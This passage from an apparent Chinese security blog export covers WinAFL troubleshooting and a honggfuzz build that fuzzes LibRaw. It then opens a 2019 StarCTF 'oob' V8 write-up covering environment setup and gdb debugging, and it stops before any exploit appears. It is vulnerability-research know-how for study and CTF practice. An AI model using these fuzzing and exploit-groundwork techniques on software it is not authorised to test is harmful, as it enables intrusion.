plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe -i D:\Dropbox\fuzzing\test\minset -o output -M master -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -- -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><h3 id="dry-run"><a href="#dry-run" class="headerlink" title="dry-run"></a>dry-run</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Dry-run failed, 2 executions resulted differently: </span><br><span class="line">Tuples matching? False </span><br><span class="line">Return codes matching? True</span><br></pre></td></tr></table></figure><p>这个 Bug，我感觉是<code>winafl-cmin.py</code>写的有些问题，目前大概发现两种解决办法。</p><p>First：<a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html%EF%BC%8C%E5%8F%82%E8%80%83%E8%BF%99%E7%AF%87%E4%BD%9C%E8%80%85%EF%BC%8C%E8%AE%A9">https://symeonp.github.io/2017/09/17/fuzzing-winafl.html，参考这篇作者，让</a> <code>target</code> 执行一次样本，把垃圾样本剔除。</p><p>Second：在执行<code>winafl-cmin.py</code>的时候，加入 <code>--skip-dry-run</code>，跳过 dry-run</p><h3 id="time-out"><a href="#time-out" class="headerlink" title="time out"></a>time out</h3><p>我所碰到的情况都是 <code>target</code>偏移没有找对，然后运行 <code>winafl</code>的时候就会无限 time out</p><h1 id="Honggfuzz-Build"><a href="#Honggfuzz-Build" class="headerlink" title="Honggfuzz Build"></a>Honggfuzz Build</h1><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 18.04</p><h2 id="HonggFuzz-搭建"><a href="#HonggFuzz-搭建" class="headerlink" title="HonggFuzz 搭建"></a>HonggFuzz 搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install clang-10</span><br><span class="line">$ sudo apt install libbfd-dev</span><br><span class="line">$ sudo apt install libunwind8-dev</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;honggfuzz.git</span><br><span class="line">$ cd honggfuzz</span><br><span class="line">honggfuzz$ make</span><br><span class="line">honggfuzz$ sudo make install</span><br></pre></td></tr></table></figure><p>然后在 <code>/usr/bin</code>里面将 <code>clang-10</code>修改为<code>clang</code> <code>clang++-10</code>修改为<code>clang++</code>（其实就是把clang-10设置成默认版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~$ clang -v</span><br><span class="line">clang version 10.0.0-4ubuntu1~18.04.2 </span><br><span class="line">Target: x86_64-pc-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line">InstalledDir: &#x2F;usr&#x2F;bin</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;8</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;8</span><br><span class="line">Selected GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Candidate multilib: .;@m64</span><br><span class="line">Selected multilib: .;@m64</span><br></pre></td></tr></table></figure><p>HoggFuzz 使用文档：<a href="https://github.com/google/honggfuzz/blob/master/docs/USAGE.md">https://github.com/google/honggfuzz/blob/master/docs/USAGE.md</a></p><h2 id="使用说明-1"><a href="#使用说明-1" class="headerlink" title="使用说明"></a>使用说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">Usage: .&#x2F;honggfuzz [options] -- path_to_command [args]</span><br><span class="line">Options:</span><br><span class="line"> --help|-h </span><br><span class="line">Help plz..</span><br><span class="line"> --input|-i VALUE</span><br><span class="line">Path to a directory containing initial file corpus</span><br><span class="line"> --output VALUE</span><br><span class="line">Output data (new dynamic coverage corpus, or the minimized coverage corpus) is written to this directory (default: input directory is used)</span><br><span class="line"> --persistent|-P </span><br><span class="line">Enable persistent fuzzing (use hfuzz_cc&#x2F;hfuzz-clang to compile code). This will be auto-detected!!!</span><br><span class="line"> --instrument|-z </span><br><span class="line">*DEFAULT-MODE-BY-DEFAULT* Enable compile-time instrumentation (use hfuzz_cc&#x2F;hfuzz-clang to compile code)</span><br><span class="line"> --minimize|-M </span><br><span class="line">Minimize the input corpus. It will most likely delete some corpus files (from the --input directory) if no --output is used!</span><br><span class="line"> --noinst|-x </span><br><span class="line">Static mode only, disable any instrumentation (hw&#x2F;sw) feedback</span><br><span class="line"> --keep_output|-Q </span><br><span class="line">Don&#39;t close children&#39;s stdin, stdout, stderr; can be noisy</span><br><span class="line"> --timeout|-t VALUE</span><br><span class="line">Timeout in seconds (default: 10)</span><br><span class="line"> --threads|-n VALUE</span><br><span class="line">Number of concurrent fuzzing threads (default: number of CPUs &#x2F; 2)</span><br><span class="line"> --stdin_input|-s </span><br><span class="line">Provide fuzzing input on STDIN, instead of ___FILE___</span><br><span class="line"> --mutations_per_run|-r VALUE</span><br><span class="line">Maximal number of mutations per one run (default: 6)</span><br><span class="line"> --logfile|-l VALUE</span><br><span class="line">Log file</span><br><span class="line"> --verbose|-v </span><br><span class="line">Disable ANSI console; use simple log output</span><br><span class="line"> --verifier|-V </span><br><span class="line">Enable crashes verifier</span><br><span class="line"> --debug|-d </span><br><span class="line">Show debug messages (level &gt;&#x3D; 4)</span><br><span class="line"> --quiet|-q </span><br><span class="line">Show only warnings and more serious messages (level &lt;&#x3D; 1)</span><br><span class="line"> --extension|-e VALUE</span><br><span class="line">Input file extension (e.g. &#39;swf&#39;), (default: &#39;fuzz&#39;)</span><br><span class="line"> --workspace|-W VALUE</span><br><span class="line">Workspace directory to save crashes &amp; runtime files (default: &#39;.&#39;)</span><br><span class="line"> --crashdir VALUE</span><br><span class="line">Directory where crashes are saved to (default: workspace directory)</span><br><span class="line"> --covdir_all VALUE</span><br><span class="line">** DEPRECATED ** use --output</span><br><span class="line"> --covdir_new VALUE</span><br><span class="line">New coverage (beyond the dry-run fuzzing phase) is written to this separate directory</span><br><span class="line"> --dict|-w VALUE</span><br><span class="line">Dictionary file. Format:http:&#x2F;&#x2F;llvm.org&#x2F;docs&#x2F;LibFuzzer.html#dictionaries</span><br><span class="line"> --stackhash_bl|-B VALUE</span><br><span class="line">Stackhashes blacklist file (one entry per line)</span><br><span class="line"> --mutate_cmd|-c VALUE</span><br><span class="line">External command producing fuzz files (instead of internal mutators)</span><br><span class="line"> --pprocess_cmd VALUE</span><br><span class="line">External command postprocessing files produced by internal mutators</span><br><span class="line"> --ffmutate_cmd VALUE</span><br><span class="line">External command mutating files which have effective coverage feedback</span><br><span class="line"> --run_time VALUE</span><br><span class="line">Number of seconds this fuzzing session will last (default: 0 [no limit])</span><br><span class="line"> --iterations|-N VALUE</span><br><span class="line">Number of fuzzing iterations (default: 0 [no limit])</span><br><span class="line"> --rlimit_as VALUE</span><br><span class="line">Per process RLIMIT_AS in MiB (default: 0 [no limit])</span><br><span class="line"> --rlimit_rss VALUE</span><br><span class="line">Per process RLIMIT_RSS in MiB (default: 0 [no limit]). It will also set *SAN&#39;s soft_rss_limit_mb if used</span><br><span class="line"> --rlimit_data VALUE</span><br><span class="line">Per process RLIMIT_DATA in MiB (default: 0 [no limit])</span><br><span class="line"> --rlimit_core VALUE</span><br><span class="line">Per process RLIMIT_CORE in MiB (default: 0 [no cores are produced])</span><br><span class="line"> --report|-R VALUE</span><br><span class="line">Write report to this file (default: &#39;&lt;workdir&gt;&#x2F;HONGGFUZZ.REPORT.TXT&#39;)</span><br><span class="line"> --max_file_size|-F VALUE</span><br><span class="line">Maximal size of files processed by the fuzzer in bytes (default: 1048576 &#x3D; 1MB)</span><br><span class="line"> --clear_env </span><br><span class="line">Clear all environment variables before executing the binary</span><br><span class="line"> --env|-E VALUE</span><br><span class="line">Pass this environment variable, can be used multiple times</span><br><span class="line"> --save_all|-u </span><br><span class="line">Save all test-cases (not only the unique ones) by appending the current time-stamp to the filenames</span><br><span class="line"> --save_smaller|-U</span><br><span class="line">    Save smaller test-cases, renaming first found with .orig suffix</span><br><span class="line"> --tmout_sigvtalrm|-T </span><br><span class="line">Use SIGVTALRM to kill timeouting processes (default: use SIGKILL)</span><br><span class="line"> --sanitizers|-S </span><br><span class="line">Enable sanitizers settings (default: false)</span><br><span class="line"> --monitor_sigabrt VALUE</span><br><span class="line">Monitor SIGABRT (default: false for Android, true for other platforms)</span><br><span class="line"> --no_fb_timeout VALUE</span><br><span class="line">Skip feedback if the process has timeouted (default: false)</span><br><span class="line"> --exit_upon_crash </span><br><span class="line">Exit upon seeing the first crash (default: false)</span><br><span class="line"> --socket_fuzzer </span><br><span class="line">Instrument external fuzzer via socket</span><br><span class="line"> --netdriver </span><br><span class="line">Use netdriver (libhfnetdriver&#x2F;). In most cases it will be autodetected through a binary signature</span><br><span class="line"> --only_printable </span><br><span class="line">Only generate printable inputs</span><br><span class="line"> --linux_symbols_bl VALUE</span><br><span class="line">Symbols blacklist filter file (one entry per line)</span><br><span class="line"> --linux_symbols_wl VALUE</span><br><span class="line">Symbols whitelist filter file (one entry per line)</span><br><span class="line"> --linux_addr_low_limit VALUE</span><br><span class="line">Address limit (from si.si_addr) below which crashes are not reported, (default: 0)</span><br><span class="line"> --linux_keep_aslr </span><br><span class="line">Don&#39;t disable ASLR randomization, might be useful with MSAN</span><br><span class="line"> --linux_perf_ignore_above VALUE</span><br><span class="line">Ignore perf events which report IPs above this address</span><br><span class="line"> --linux_perf_instr </span><br><span class="line">Use PERF_COUNT_HW_INSTRUCTIONS perf</span><br><span class="line"> --linux_perf_branch </span><br><span class="line">Use PERF_COUNT_HW_BRANCH_INSTRUCTIONS perf</span><br><span class="line"> --linux_perf_bts_edge </span><br><span class="line">Use Intel BTS to count unique edges</span><br><span class="line"> --linux_perf_ipt_block </span><br><span class="line">Use Intel Processor Trace to count unique blocks (requires libipt.so)</span><br><span class="line"> --linux_perf_kernel_only </span><br><span class="line">Gather kernel-only coverage with Intel PT and with Intel BTS</span><br><span class="line"> --linux_ns_net </span><br><span class="line">Use Linux NET namespace isolation</span><br><span class="line"> --linux_ns_pid </span><br><span class="line">Use Linux PID namespace isolation</span><br><span class="line"> --linux_ns_ipc </span><br><span class="line">Use Linux IPC namespace isolation</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"> Run the binary over a mutated file chosen from the directory. Disable fuzzing feedback (static mode):</span><br><span class="line">  honggfuzz -i input_dir -x -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, provide input over STDIN:</span><br><span class="line">  honggfuzz -i input_dir -x -s -- &#x2F;usr&#x2F;bin&#x2F;djpeg</span><br><span class="line"> Use compile-time instrumentation (-fsanitize-coverage&#x3D;trace-pc-guard,...):</span><br><span class="line">  honggfuzz -i input_dir -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> Use persistent mode w&#x2F;o instrumentation:</span><br><span class="line">  honggfuzz -i input_dir -P -x -- &#x2F;usr&#x2F;bin&#x2F;djpeg_persistent_mode</span><br><span class="line"> Use persistent mode and compile-time (-fsanitize-coverage&#x3D;trace-pc-guard,...) instrumentation:</span><br><span class="line">  honggfuzz -i input_dir -P -- &#x2F;usr&#x2F;bin&#x2F;djpeg_persistent_mode</span><br><span class="line"> Run the binary with dynamically generate inputs, maximize total no. of instructions:</span><br><span class="line">  honggfuzz --linux_perf_instr -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize total no. of branches:</span><br><span class="line">  honggfuzz --linux_perf_branch -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize unique branches (edges) via Intel BTS:</span><br><span class="line">  honggfuzz --linux_perf_bts_edge -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize unique code blocks via Intel Processor Trace (requires libipt.so):</span><br><span class="line">  honggfuzz --linux_perf_ipt_block -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install pkg-config m4 libtool automake autoconf</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;LibRaw&#x2F;LibRaw.git</span><br><span class="line">$ cd LibRaw</span><br><span class="line">..&#x2F;Libraw$ export CC&#x3D;hfuzz-clang CXX&#x3D;hfuzz-clang++</span><br><span class="line">..&#x2F;Libraw$ autoreconf --install</span><br><span class="line">..&#x2F;Libraw$ .&#x2F;configure</span><br><span class="line">..&#x2F;Libraw$ make</span><br></pre></td></tr></table></figure><blockquote><p>libtool: link: hfuzz-clang++ -g -O2 -fopenmp -o bin/.libs/dcraw_emu samples/bin_dcraw_emu-dcraw_emu.o  lib/.libs/libraw.so -lz -lm -fopenmp</p><p>编译插桩成功</p></blockquote><p>然后我们用 honggfuzz 跑一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ export LD_LIBRARY_PATH&#x3D;..&#x2F;..&#x2F;lib&#x2F;.libs&#x2F;</span><br><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ .&#x2F;dcraw_emu</span><br><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ honggfuzz -f ..&#x2F;in -W ..&#x2F;out -t 5 -- .&#x2F;dcraw_emu ___FILE___</span><br></pre></td></tr></table></figure><p>页面显示大致如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-···········[ 0 days 00 hrs 28 mins 42 secs ] ··········</span><br><span class="line">Iterations : 35,520 [35. 52k]</span><br><span class="line">Mode [3&#x2F;3] : Feedback Driven Mode</span><br><span class="line">Target : .&#x2F;dcraw_ enu FILE_</span><br><span class="line">Threads : 1, CPUs: 2, CPU%: 200% [ 100%&#x2F;CPU]</span><br><span class="line">Speed : 0&#x2F;sec [avg: 20]</span><br><span class="line">Crashes : 78 [unique: 55, blocklist: o, verified: 0]</span><br><span class="line">Timeouts : 46 [5 sec]</span><br><span class="line">Corpus size : 2,965, nax: 1, 048,576 bytes, init: 20 files</span><br><span class="line">Cov Update : 0 days 00 hrs 00 mins 02 secs ago</span><br><span class="line">Coverage : edge: 1,110&#x2F;19,858 [5%] pc: 140 cnp: 89 ,337</span><br><span class="line">··········· [ LOGS ] ········· &#x2F; honggfuzz 2.4 &#x2F; -</span><br><span class="line">z:409 Tm:3,746us (i&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;6, Cur:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;178</span><br><span class="line">Sz:430 Tฅ:4 , 501us (t&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;2, Cur:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;178</span><br><span class="line">Sz :228001 Tm:238,719us (i&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;17, Cur :0&#x2F;0&#x2F;0&#x2F;2&#x2F;0&#x2F;302</span><br></pre></td></tr></table></figure><h1 id="AFL-Build"><a href="#AFL-Build" class="headerlink" title="AFL Build"></a>AFL Build</h1><p>详细参考上篇：<a href="https://0xfocu5.github.io/posts/2ba75ee3/">https://0xfocu5.github.io/posts/2ba75ee3/</a></p><ul><li>直接安装：<code>sudo apt install afl</code></li><li><a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：<code>sudo make;sudo make install</code></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/googleprojectzero/winafl/issues/179">https://github.com/googleprojectzero/winafl/issues/179</a></p><p><a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p><a href="https://x9security.com/installing-winafl/">https://x9security.com/installing-winafl/</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Winafl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-StarCtf-oob</title>
      <link href="posts/7eb4a1e6/"/>
      <url>posts/7eb4a1e6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过 <code>2019-starctf</code>的一道例题尝试入门 <code>v8</code>。跟着前辈们学习并记录一下自己的复现路程。</p><p>环境：Ubuntu 18.04</p><p>题目：<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">下载链接</a>:<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>翻墙 翻墙 翻墙</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git <span class="comment">#下载谷歌源码管理器</span></span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/depot_tools  <span class="comment">#加入环境变量</span></span><br><span class="line">$ mkdir chromium</span><br><span class="line">$ <span class="built_in">cd</span> chromium</span><br><span class="line">$ fetch --no-history v8  <span class="comment">#获取v8源码</span></span><br><span class="line">$ <span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><p>把题目给出的<code>diff</code>文件应用到源码中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">$ gclient sync <span class="comment">#同步solution的各个仓库</span></span><br><span class="line">$ git apply ../oob.diff  <span class="comment">#将diff文件加入到v8中源代码分支中</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.release</span><br><span class="line">$ ninja -C ./out.gn/x64.release <span class="comment"># Release version</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C ./out.gn/x64.debug <span class="comment"># Debug version</span></span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="V8流程"><a href="#V8流程" class="headerlink" title="V8流程"></a>V8流程</h3><p><code>JavaScript</code>是一门解释型语言，而<code>v8</code>则是<code>chrome</code>浏览器的<code>JavaScript</code>解析引擎，大多数漏洞都是由<code>v8</code>所引起的 (<code>v8</code>编译过后的可执行文件是<code>d8</code>).</p><p><code>JavaScript</code>的执行流程大致如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200922110125.png" alt="image-20200921161412221"></p><ul><li>JS 源代码经过词法分析形成 <code>Token</code>，解析器(Parser)解析<code>token</code>形成抽象语法树(AST)</li><li>解释器(Ignition)将 AST 生成可执行的字节码。解释器可以直接执行字节码，或者通过编译器将其编译为二进制的机器代码再执行。</li><li>解释器执行字节码过程中，如果发现代码被重复执行，热点代码(HotSpot)超过阈值后就会丢给优化编译器(TurboFan)编译成二进制代码，然后优化。下次再执行时则直接执行这段优化后的二进制代码。</li><li>如果JS对象发生变更，优化后的二进制代码变为无效代码，编译器执行反优化，下次执行就回退到解释器解释执行。</li></ul><h3 id="V8调试"><a href="#V8调试" class="headerlink" title="V8调试"></a>V8调试</h3><p>入这个选项就可以在<code>js</code>中调用一些有助于调试的本地运行时函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) 输出对象地址</span><br><span class="line">%SystemBreak() 触发调试中断主要结合gdb等调试器使用</span><br></pre></td></tr></table></figure><p>PS:v8团队的专门编写了一个<code>gdb</code>的<code>gdbinit</code>脚本。在<code>~/xxx/v8/tools</code>下，将其更名为<code>gdbinit_v8</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cp gdbinit_v8 ~/.gdbinit_v8</span><br><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ vim .gdbinit</span><br><span class="line"><span class="comment">#加入下面内容</span></span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br><span class="line"><span class="built_in">source</span> User/xxx/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>有两个常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">job [address_of_obj]  # gdbinit_v8中的特有命令，打印出对象内存结构，注意对象地址为其实际地址加1</span><br><span class="line">telescope [real_address] [num] # pwndbg命令，打印出real_address地址处num个内存单元的值，该地址为真实地址</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;focu5&#x2F;chromium&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">...</span><br><span class="line">DebugPrint: 0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 